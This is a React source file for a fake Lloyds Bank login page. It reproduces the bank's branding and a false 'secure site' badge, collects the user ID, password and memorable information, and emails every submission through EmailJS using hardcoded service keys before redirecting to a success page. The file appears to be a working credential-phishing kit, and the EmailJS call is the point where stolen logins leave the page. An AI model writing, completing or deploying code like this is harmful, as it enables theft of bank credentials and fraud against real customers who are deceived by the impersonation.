// src/pages/Login.jsx
import React, { useRef, useState } from "react";
import { FaLock } from "react-icons/fa";
import { MdErrorOutline } from "react-icons/md";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";

export default function LloydsBank() {
  const form = useRef();
  const navigate = useNavigate();

  const [errors, setErrors] = useState({
    userId: false,
    password: false,
    memorable: false
  });

  const sendLoginEmail = (e) => {
    e.preventDefault();

    const formData = new FormData(form.current);
    const userId = formData.get("userId");
    const password = formData.get("password");
    const memorable = formData.get("memorable");

    const newErrors = {
      userId: !userId,
      password: !password,
      memorable: !memorable
    };
    setErrors(newErrors);

    if (!newErrors.userId && !newErrors.password && !newErrors.memorable) {
      emailjs
        .sendForm(
          "service_e1eul13",
          "template_x4r3vzo",
          form.current,
          "nb4k7l5gjhCm1Jyk1"
        )
        .then(
          (result) => {
            console.log("Email sent:", result.text);
            navigate("/success");
          },
          (error) => {
            console.log("Error:", error.text);
          }
        );

      e.target.reset();
    }
  };

  return (
    <div className="min-h-screen bg-white">
      {/* ✅ Header */}
      {/* ✅ Header */}
      <header className="bg-[#006A4E] text-white flex flex-col md:flex-row items-center justify-center px-4 sm:px-6 lg:px-20 py-4 space-y-4 md:space-y-0 md:space-x-30">
        {/* Left: Logo */}
        <div className="flex items-center justify-center">
          <img
            src="/img/lloydsbank logo.png"
            alt="Logo"
            className="h-12 sm:h-14 w-auto"
          />
        </div>

        {/* Right: Links + Secure */}
        <div className="flex flex-col md:flex-row items-center space-y-3 md:space-y-0 md:space-x-6 text-center md:text-left">
          <a href="#" className="underline text-sm sm:text-base">
            Mobile
          </a>
          <a href="#" className="underline text-sm sm:text-base">
            Cookie policy
          </a>
          <div className="border border-white px-4 py-2 md:px-6 md:py-3 text-xs sm:text-sm">
            <p className="font-semibold flex items-center justify-center md:justify-start space-x-2">
              <FaLock className="text-white" />
              <span>You’re logging into a secure site</span>
            </p>
            <a href="#" className="underline text-xs block mt-1">
              How can I tell that this site is secure?
            </a>
          </div>
        </div>
      </header>

      {/* ✅ Login Form */}
      <main className="flex justify-center mt-10 px-4 sm:px-6">
        <form
          ref={form}
          onSubmit={sendLoginEmail}
          className="w-full max-w-lg rounded-md p-6 shadow-md bg-white"
        >
          {/* User ID */}
          <div className="mb-4">
            <label className="block text-sm font-medium mb-1">User ID:</label>
            <div
              className={`p-3 rounded border-2 ${
                errors.userId
                  ? "border-red-500 bg-red-50"
                  : "border-gray-300 bg-white"
              }`}
            >
              <input
                type="text"
                name="userId"
                className="w-full bg-transparent outline-none text-base"
                placeholder="Enter User ID"
              />
            </div>
            {errors.userId && (
              <p className="flex items-center text-red-600 mt-2 text-sm">
                <MdErrorOutline className="mr-1 text-lg" />
                Please enter a value.
              </p>
            )}
          </div>

          {/* Password */}
          <div className="mb-4">
            <label className="block text-sm font-medium mb-1">Password:</label>
            <div
              className={`p-3 rounded border-2 ${
                errors.password
                  ? "border-red-500 bg-red-50"
                  : "border-gray-300 bg-white"
              }`}
            >
              <input
                type="password"
                name="password"
                className="w-full bg-transparent outline-none text-base"
                placeholder="Enter Password"
              />
            </div>
            {errors.password && (
              <p className="flex items-center text-red-600 mt-2 text-sm">
                <MdErrorOutline className="mr-1 text-lg" />
                Please enter a value.
              </p>
            )}
          </div>

          {/* Memorable */}
          <div className="mb-6">
            <label className="block text-sm font-medium mb-1">Memorable:</label>
            <div
              className={`p-3 rounded border-2 ${
                errors.memorable
                  ? "border-red-500 bg-red-50"
                  : "border-gray-300 bg-white"
              }`}
            >
              <input
                type="text"
                name="memorable"
                className="w-full bg-transparent outline-none text-base"
                placeholder="Enter memorable"
              />
            </div>
            {errors.memorable && (
              <p className="flex items-center text-red-600 mt-2 text-sm">
                <MdErrorOutline className="mr-1 text-lg" />
                Please enter a value.
              </p>
            )}
          </div>

          {/* Continue Button */}
          <div className="flex justify-start">
            <button
              type="submit"
              className="w-full sm:w-auto px-6 py-3 bg-[#006A4E] text-white font-semibold transition"
            >
              Continue
            </button>
          </div>
        </form>
      </main>
    </div>
  );
}
